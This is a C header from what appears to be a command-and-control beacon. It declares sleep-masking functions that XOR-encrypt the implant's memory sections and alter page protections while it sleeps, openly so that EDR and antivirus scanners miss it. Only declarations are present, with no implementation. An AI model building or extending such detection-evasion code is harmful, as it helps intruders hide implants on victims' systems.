#pragma once

/*
 * WaitMask.h - Sleep Masking and Memory Encryption
 *
 * Provides functionality to encrypt memory sections during sleep
 * to prevent EDR/AV from scanning beacon memory while idle.
 */

#include <windows.h>
#include "ApiLoader.h"
#include "utils.h"
#include "StringCrypt.h"

// Sleep mask configuration
typedef struct _SLEEP_MASK_CONFIG {
    PVOID   pBeaconBase;          // Beacon module base address
    SIZE_T  beaconSize;           // Beacon module size
    PVOID   pTextSection;         // .text section base
    SIZE_T  textSectionSize;      // .text section size
    PVOID   pRdataSection;        // .rdata section base
    SIZE_T  rdataSectionSize;     // .rdata section size
    PVOID   pDataSection;         // .data section base
    SIZE_T  dataSectionSize;      // .data section size
    BYTE    xorKey;               // XOR key for encryption
    BOOL    bEncryptText;         // Encrypt .text section
    BOOL    bEncryptRdata;        // Encrypt .rdata section
    BOOL    bEncryptData;         // Encrypt .data section
    DWORD   previousTextProtect;  // Original .text protection
    DWORD   previousRdataProtect; // Original .rdata protection
    DWORD   previousDataProtect;  // Original .data protection
} SLEEP_MASK_CONFIG, *PSLEEP_MASK_CONFIG;

// Global sleep mask state
extern SLEEP_MASK_CONFIG g_SleepMaskConfig;

// Function declarations

/**
 * Initialize sleep mask configuration
 * @param pBeaconBase Beacon base address
 * @param beaconSize Beacon module size
 * @return TRUE if successful, FALSE otherwise
 */
BOOL InitSleepMask(PVOID pBeaconBase, SIZE_T beaconSize);

/**
 * Encrypt memory sections before sleep
 * @return TRUE if successful, FALSE otherwise
 */
BOOL SleepMaskEncrypt();

/**
 * Decrypt memory sections after sleep
 * @return TRUE if successful, FALSE otherwise
 */
BOOL SleepMaskDecrypt();

/**
 * Sleep with memory encryption
 * @param ms Milliseconds to sleep
 */
void MaskedSleep(DWORD ms);

/**
 * Sleep with memory encryption and jitter
 * @param ms Milliseconds to sleep
 * @param jitter Jitter percentage (0-100)
 */
void MaskedSleepWithJitter(DWORD ms, DWORD jitter);

/**
 * Encrypt specific memory region
 * @param pAddress Memory address
 * @param size Memory size
 * @param key XOR key
 * @return TRUE if successful, FALSE otherwise
 */
BOOL EncryptMemoryRegion(PVOID pAddress, SIZE_T size, BYTE key);

/**
 * Decrypt specific memory region
 * @param pAddress Memory address
 * @param size Memory size
 * @param key XOR key
 * @return TRUE if successful, FALSE otherwise
 */
BOOL DecryptMemoryRegion(PVOID pAddress, SIZE_T size, BYTE key);

/**
 * Change memory protection safely
 * @param pAddress Memory address
 * @param size Memory size
 * @param newProtect New protection
 * @param pOldProtect Old protection output
 * @return TRUE if successful, FALSE otherwise
 */
BOOL SafeVirtualProtect(PVOID pAddress, SIZE_T size, DWORD newProtect, PDWORD pOldProtect);

/**
 * Get section information from module
 * @param hModule Module handle
 * @param sectionName Section name (.text, .rdata, .data)
 * @param pBase Output section base
 * @param pSize Output section size
 * @return TRUE if successful, FALSE otherwise
 */
BOOL GetSectionInfo(HMODULE hModule, LPCSTR sectionName, PVOID* pBase, SIZE_T* pSize);

/**
 * Generate random XOR key
 * @return Random XOR key
 */
BYTE GenerateXorKey();

/**
 * Reset sleep mask configuration
 */
void ResetSleepMaskConfig();

/**
 * Cleanup sleep mask resources
 */
void CleanupSleepMask();

// Existing functions (from original WaitMask.h)
void WaitMask(ULONG worktime, ULONG sleepTime, ULONG jitter);
void WaitMaskWithEvent(HANDLE hEvent, ULONG worktime, ULONG sleepTime, ULONG jitter);
void mySleep(ULONG ms);